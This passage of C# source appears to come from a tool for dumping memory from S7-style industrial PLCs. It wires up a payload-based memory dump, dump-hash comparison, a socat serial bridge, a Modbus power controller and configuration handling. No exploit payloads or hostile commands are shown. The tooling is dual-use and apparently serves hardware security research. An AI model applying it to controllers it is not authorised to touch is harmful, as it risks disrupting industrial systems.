                double remainingSeconds = (bytesPerSecond > 0) ? (length - bytesRead) / bytesPerSecond : 0;

                // Post UI updates to the UI thread
                Dispatch(() =>
                {
                    DumpProgressPercentage = percentage;
                    DumpProgressBytes = $"Read: {bytesRead} / {length} bytes";
                    DumpProgressTime = $"Elapsed: {elapsed.TotalSeconds:F0}s | Remaining: {remainingSeconds:F0}s";
                });
            });

            var dumpedData = await plcClient.DumpMemoryAsync(address, length, dumperPayload, progress);
            stopwatch.Stop();

            // Ensure dumps directory exists and resolve the path
            string resolvedDumpsPath = Models.ApplicationConfiguration.ResolvePath(DumpsPath, Models.ApplicationConfiguration.GetDefaultDumpsPath());
            string outFilename = $"mem_dump_{address:x8}_{address + length:x8}.bin";
            string fullPath = System.IO.Path.Combine(resolvedDumpsPath, outFilename);
            
            await System.IO.File.WriteAllBytesAsync(fullPath, dumpedData);
            Logging.Log($"Successfully dumped {dumpedData.Length} bytes to {fullPath} in {stopwatch.Elapsed.TotalSeconds:F1}s.", LogCategory.Info);
        }

        /// <summary>
        /// Compares all dump files in a specified folder.
        /// </summary>
        private async Task CompareDumpsAsync()
        {
            if (string.IsNullOrWhiteSpace(CompareFolder) || !System.IO.Directory.Exists(CompareFolder))
            {
                await _dialogService.ShowMessageAsync("Error", "Please select a valid folder.");
                return;
            }

            IsComparing = true;
            try
            {
                string report = await Task.Run(async () =>
                {
                    var comparer = new S7.Utils.DumpComparer(message => Logging.Log(message, LogCategory.Info));
                    var fileHashes = await comparer.ComputeFileHashesAsync(CompareFolder);
                    return comparer.GenerateFolderCompareReport(fileHashes, CompareFolder);
                });

                await _dialogService.ShowMessageAsync("Comparison Result", report);
                Logging.Log("Comparison complete. See popup for detailed result.");
            }
            catch (Exception ex)
            {
                await _dialogService.ShowMessageAsync("Error", $"Error during folder compare: {ex.Message}");
                Logging.Log($"Error during folder compare: {ex.ToString()}", LogCategory.Error);
            }
            finally
            {
                IsComparing = false;
            }
        }

        private Task CheckSocatProcesses()
        {
            return Task.Run(() =>
            {
                var pids = SocatService.GetSocatProcessIds();
                if (pids.Length == 0)
                    Logging.Log("No running socat instances detected.", LogCategory.Info);
                else
                    Logging.Log($"Socat running instances: {string.Join(", ", pids)}", LogCategory.Info);
            });
        }

        private Task KillSocatProcesses()
        {
            return Task.Run(() =>
            {
                SocatService.KillAllSocatProcesses(s => Logging.Log(s, LogCategory.Info));
            });
        }

        /// <summary>
        /// Refreshes the list of available serial ports.
        /// </summary>
        private void RefreshSerialPorts()
        {
            Task.Run(() =>
            {
                var ports = System.IO.Ports.SerialPort.GetPortNames();
                Dispatcher.UIThread.Post(() =>
                {
                    AvailableSerialPorts.Clear();
                    foreach (var port in ports)
                    {
                        AvailableSerialPorts.Add(port);
                    }
                    if (AvailableSerialPorts.Any())
                    {
                        SelectedSerialPort = AvailableSerialPorts[0];
                    }
                });
            });
        }

        /// <summary>
        /// Starts the socat service.
        /// </summary>
        private Task StartSocatAsync()
        {
            return Task.Run(async () =>
            {
                try
                {
                    _socatService.Start(SelectedSerialPort, SocatTcpPort, SocatVerbose, SocatHexDump, SocatBlockSize);
                    Dispatcher.UIThread.Post(() => SocatStatus = "Running");
                }
                catch (Exception ex)
                {
                    Logging.Log($"Error starting socat: {ex.ToString()}", LogCategory.Error);
                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Error", $"Error starting socat: {ex.Message}");
                        SocatStatus = "Error";
                    });
                }
            });
        }

        /// <summary>
        /// Stops the socat service.
        /// </summary>
        private Task StopSocatAsync()
        {
            return Task.Run(async () =>
            {
                try
                {
                    _socatService.Stop();
                    Dispatcher.UIThread.Post(() => SocatStatus = "Stopped");
                }
                catch (Exception ex)
                {
                    Logging.Log($"Error stopping socat: {ex.ToString()}", LogCategory.Error);
                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Error", $"Error stopping socat: {ex.Message}");
                    });
                }
            });
        }

        private Task ConnectModbusAsync()
        {
            return Task.Run(async () =>
            {
                try
                {
                    await _powerController.ConnectAsync(ModbusHost, ModbusPort);
                    Dispatcher.UIThread.Post(() => ModbusStatus = _powerController.IsConnected ? "Connected" : "Error");
                }
                catch (Exception ex)
                {
                    Logging.Log($"Error connecting to Modbus: {ex.ToString()}", LogCategory.Error);
                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Error", $"Error connecting to Modbus: {ex.Message}");
                        ModbusStatus = "Error";
                    });
                }
            });
        }

        private void DisconnectModbus()
        {
            _powerController.Disconnect();
            ModbusStatus = "Disconnected";
        }

        /// <summary>
        /// Saves the current configuration to a file.
        /// </summary>
        private Task SaveConfiguration()
        {
            return Task.Run(async () =>
            {
                var path = await Dispatcher.UIThread.InvokeAsync(async () =>
                {
                    return await _dialogService.ShowSaveFileDialogAsync("Save Configuration", "json", "JSON Files");
                });

                if (path != null)
                {
                    var config = new Models.ApplicationConfiguration
                    {
                        PlcHost = this.PlcHost,
                        PlcPort = this.PlcPort,
                        ModbusHost = this.ModbusHost,
                        ModbusPort = this.ModbusPort,
                        ModbusCoil = this.ModbusCoil,
                        DelaySeconds = this.DelaySeconds,
                        DumpAddress = this.DumpAddress,
                        DumpLength = this.DumpLength,
                        CompareFolder = this.CompareFolder,
                        CompareFile1 = this.CompareFile1,
                        CompareFile2 = this.CompareFile2,
                        SelectedSerialPort = this.SelectedSerialPort,
                        SocatTcpPort = this.SocatTcpPort,
                        SelectedBaudRate = this.SelectedBaudRate,
                        SelectedParity = this.SelectedParity,
                        SelectedStopBits = this.SelectedStopBits,
                        SelectedFlowControl = this.SelectedFlowControl,
                        SocatVerbose = this.SocatVerbose,
                        SocatHexDump = this.SocatHexDump,
                        SocatBlockSize = this.SocatBlockSize
                    };
                    await ConfigService.SaveConfiguration(config, path);
                }
            });
        }

        /// <summary>
        /// Loads the configuration from a file.
        /// </summary>
        private Task LoadConfiguration()
        {
            return Task.Run(async () =>
            {
                var path = await Dispatcher.UIThread.InvokeAsync(async () =>
                {
                    return await _dialogService.ShowOpenFileDialogAsync("Load Configuration", "json", "JSON Files");
                });

                if (path != null)
                {
                    var config = await ConfigService.LoadConfiguration(path);
                    if (config != null)
                    {
                        Dispatcher.UIThread.Post(() =>
                        {
                            PlcHost = config.PlcHost;
                            PlcPort = config.PlcPort;
                            ModbusHost = config.ModbusHost;
                            ModbusPort = config.ModbusPort;
                            ModbusCoil = config.ModbusCoil;
                            DelaySeconds = config.DelaySeconds;
                            DumpAddress = config.DumpAddress;
                            DumpLength = config.DumpLength;
                            CompareFolder = config.CompareFolder;
                            CompareFile1 = config.CompareFile1;
                            CompareFile2 = config.CompareFile2;
                            SelectedSerialPort = config.SelectedSerialPort;
                            SocatTcpPort = config.SocatTcpPort;
                            SelectedBaudRate = config.SelectedBaudRate;
                            SelectedParity = config.SelectedParity;
                            SelectedStopBits = config.SelectedStopBits;
                            SelectedFlowControl = config.SelectedFlowControl;
                            SocatVerbose = config.SocatVerbose;
                            SocatHexDump = config.SocatHexDump;
                            SocatBlockSize = config.SocatBlockSize;
                            PayloadsPath = config.PayloadsPath;
                            DumpsPath = config.DumpsPath;
                            LogsPath = config.LogsPath;
                            ExtractionPath = config.ExtractionPath;
                        });
                    }
                }
            });
        }

        /// <summary>
        /// Loads the configuration from the default file on startup.
        /// </summary>
        public void LoadConfigurationOnStartup()
        {
            Task.Run(() =>
            {
                try
                {
                    var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                    if (System.IO.File.Exists(path))
                    {
                        var config = System.Text.Json.JsonSerializer.Deserialize<Models.ApplicationConfiguration>(System.IO.File.ReadAllText(path));
                        if (config != null)
                        {
                            Dispatcher.UIThread.Post(() =>
                            {
                                PlcHost = config.PlcHost;
                                PlcPort = config.PlcPort;
                                ModbusHost = config.ModbusHost;
                                ModbusPort = config.ModbusPort;
                                ModbusCoil = config.ModbusCoil;
                                DelaySeconds = config.DelaySeconds;
                                DumpAddress = config.DumpAddress;
                                DumpLength = config.DumpLength;
                                CompareFolder = config.CompareFolder;
                                CompareFile1 = config.CompareFile1;
                                CompareFile2 = config.CompareFile2;
                                SelectedSerialPort = config.SelectedSerialPort;
                                SocatTcpPort = config.SocatTcpPort;
                                SelectedBaudRate = config.SelectedBaudRate;
                                SelectedParity = config.SelectedParity;
                                SelectedStopBits = config.SelectedStopBits;
                                SelectedFlowControl = config.SelectedFlowControl;
                                SocatVerbose = config.SocatVerbose;
                                SocatHexDump = config.SocatHexDump;
                                SocatBlockSize = config.SocatBlockSize;
                                PayloadsPath = config.PayloadsPath;
                                DumpsPath = config.DumpsPath;
                                LogsPath = config.LogsPath;
                                ExtractionPath = config.ExtractionPath;
                            });
                        }
                    }
                    else
                    {
                        // No existing configuration file; persist current defaults as the permanent configuration
                        var defaultConfig = new Models.ApplicationConfiguration
                        {
                            PlcHost = this.PlcHost,
                            PlcPort = this.PlcPort,
                            ModbusHost = this.ModbusHost,
                            ModbusPort = this.ModbusPort,
                            ModbusCoil = this.ModbusCoil,
                            DelaySeconds = this.DelaySeconds,
                            DumpAddress = this.DumpAddress,
                            DumpLength = this.DumpLength,
                            CompareFolder = this.CompareFolder,
                            CompareFile1 = this.CompareFile1,
                            CompareFile2 = this.CompareFile2,
                            SelectedSerialPort = this.SelectedSerialPort,
                            SocatTcpPort = this.SocatTcpPort,
                            SelectedBaudRate = this.SelectedBaudRate,
                            SelectedParity = this.SelectedParity,
                            SelectedStopBits = this.SelectedStopBits,
                            SelectedFlowControl = this.SelectedFlowControl,
                            SocatVerbose = this.SocatVerbose,
                            SocatHexDump = this.SocatHexDump,
                            SocatBlockSize = this.SocatBlockSize,
                            PayloadsPath = this.PayloadsPath,
                            DumpsPath = this.DumpsPath,
                            LogsPath = this.LogsPath,
                            ExtractionPath = this.ExtractionPath
                        };

                        var options = new System.Text.Json.JsonSerializerOptions { WriteIndented = true };
                        string json = System.Text.Json.JsonSerializer.Serialize(defaultConfig, options);
                        System.IO.File.WriteAllText(path, json);
                        Logging.Log($"No configuration found. Created default configuration at {path}.", LogCategory.Info);
                    }
                }
                catch (Exception ex)
                {
                    Logging.Log($"Could not load or create configuration: {ex.ToString()}", LogCategory.Warning);
                }

                // Ensure both logging services use the configured path
                string resolvedLogsPath = Models.ApplicationConfiguration.ResolvePath(LogsPath, Models.ApplicationConfiguration.GetDefaultLogsPath());
                Logging.UpdateLogsPath(resolvedLogsPath);
                SocatLogging.UpdateLogsPath(resolvedLogsPath);
            });
        }

        /// <summary>
        /// Saves the current configuration to the default file on exit.
        /// </summary>
        public void SaveConfigurationOnExit()
        {
            Task.Run(() =>
            {
                try
                {
                    var path = System.IO.Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                    var config = new Models.ApplicationConfiguration
                    {
                        PlcHost = this.PlcHost,
                        PlcPort = this.PlcPort,
                        ModbusHost = this.ModbusHost,
                        ModbusPort = this.ModbusPort,
                        ModbusCoil = this.ModbusCoil,
                        DelaySeconds = this.DelaySeconds,
                        DumpAddress = this.DumpAddress,
                        DumpLength = this.DumpLength,
                        CompareFolder = this.CompareFolder,
                        CompareFile1 = this.CompareFile1,
                        CompareFile2 = this.CompareFile2,
                        SelectedSerialPort = this.SelectedSerialPort,
                        SocatTcpPort = this.SocatTcpPort,
                        SelectedBaudRate = this.SelectedBaudRate,
                        SelectedParity = this.SelectedParity,
                        SelectedStopBits = this.SelectedStopBits,
                        SelectedFlowControl = this.SelectedFlowControl,
                        SocatVerbose = this.SocatVerbose,
                        SocatHexDump = this.SocatHexDump,
                        SocatBlockSize = this.SocatBlockSize,
                        PayloadsPath = this.PayloadsPath,
                        DumpsPath = this.DumpsPath,
                        LogsPath = this.LogsPath,
                        ExtractionPath = this.ExtractionPath
                    };
                    var options = new System.Text.Json.JsonSerializerOptions { WriteIndented = true };
                    string json = System.Text.Json.JsonSerializer.Serialize(config, options);
                    System.IO.File.WriteAllText(path, json);
                }
                catch (Exception ex)
                {
                    Logging.Log($"Could not save configuration: {ex.ToString()}", LogCategory.Error);
                }
            });
        }

        /// <summary>
        /// Compares two selected dump files.
        /// </summary>
        private Task CompareTwoFilesAsync()
        {
            return Task.Run(async () =>
            {
                if (!System.IO.File.Exists(CompareFile1) || !System.IO.File.Exists(CompareFile2))
                {
                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Error", "Please select a valid file.");
                    });
                    return;
                }

                Dispatcher.UIThread.Post(() => IsComparing = true);
                try
                {
                    var comparer = new S7.Utils.DumpComparer();
                    string hashA = await comparer.ComputeFileHashAsync(CompareFile1);
                    string hashB = await comparer.ComputeFileHashAsync(CompareFile2);
                    bool match = hashA == hashB;
                    var sb = new System.Text.StringBuilder();
                    sb.AppendLine($"File 1: {System.IO.Path.GetFileName(CompareFile1)}");
                    sb.AppendLine($"MD5: {hashA}");
                    sb.AppendLine($"File 2: {System.IO.Path.GetFileName(CompareFile2)}");
                    sb.AppendLine($"MD5: {hashB}");
                    sb.AppendLine(match ? "=> MATCH" : "=> DIFFER");

                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Comparison Result", sb.ToString());
                    });
                    Logging.Log("Comparison complete. See popup for detailed result.");
                }
                catch (Exception ex)
                {
                    await Dispatcher.UIThread.InvokeAsync(async () =>
                    {
                        await _dialogService.ShowMessageAsync("Error", $"Error during file compare: {ex.Message}");
                    });
                    Logging.Log($"Error during file compare: {ex.ToString()}", LogCategory.Error);
                }
                finally
                {
                    Dispatcher.UIThread.Post(() => IsComparing = false);
                }
            });
        }

        /// <summary>
        /// Loads the default paths for all resource folders.
        /// </summary>
        private void LoadDefaultPaths()
        {
            // Payloads path is fixed and always points to bundled resources
            PayloadsPath = Models.ApplicationConfiguration.GetPayloadsPath();
            
            // Other paths are user-configurable and default to Resources folders
            DumpsPath = Models.ApplicationConfiguration.GetDefaultDumpsPath();
            LogsPath = Models.ApplicationConfiguration.GetDefaultLogsPath();
            ExtractionPath = Models.ApplicationConfiguration.GetDefaultExtractionPath();
            
            Logging.Log("Default paths loaded successfully.", LogCategory.Info);
            Logging.Log($"Payloads (fixed): {PayloadsPath}", LogCategory.Debug);
            Logging.Log($"Dumps: {DumpsPath}", LogCategory.Debug);
            Logging.Log($"Logs: {LogsPath}", LogCategory.Debug);
            Logging.Log($"Extraction: {ExtractionPath}", LogCategory.Debug);
        }

        /// <summary>
        /// Scans the payloads directory asynchronously and updates the DiscoveredPayloads collection.
        /// </summary>
        private async Task ScanPayloadsAsync()
        {
            if (IsScanning || string.IsNullOrWhiteSpace(PayloadsPath))
                return;

            IsScanning = true;
            
            try
            {
                await Task.Run(() =>
                {
                    var payloads = _payloadManager.ScanPayloads(PayloadsPath);
                    
                    // Update UI on the UI thread
                    Dispatcher.UIThread.Post(() =>
                    {
                        DiscoveredPayloads.Clear();
                        foreach (var payload in payloads)
                        {
                            DiscoveredPayloads.Add(payload);
                        }
                        
                        Logging.Log($"Payload scan completed. Found {payloads.Count} payload files in {PayloadsPath}", LogCategory.Info);
                        
                        // Log details about discovered payloads
                        foreach (var payload in payloads)
                        {
                            Logging.Log($"  - {payload.Type}: {payload.RelativePath} ({payload.Size} bytes)", LogCategory.Debug);
                        }
                    });
                });
            }
            catch (Exception ex)
            {
                Logging.Log($"Error scanning payloads: {ex.ToString()}", LogCategory.Error);
            }
            finally
            {
                IsScanning = false;
            }
        }
    }
}
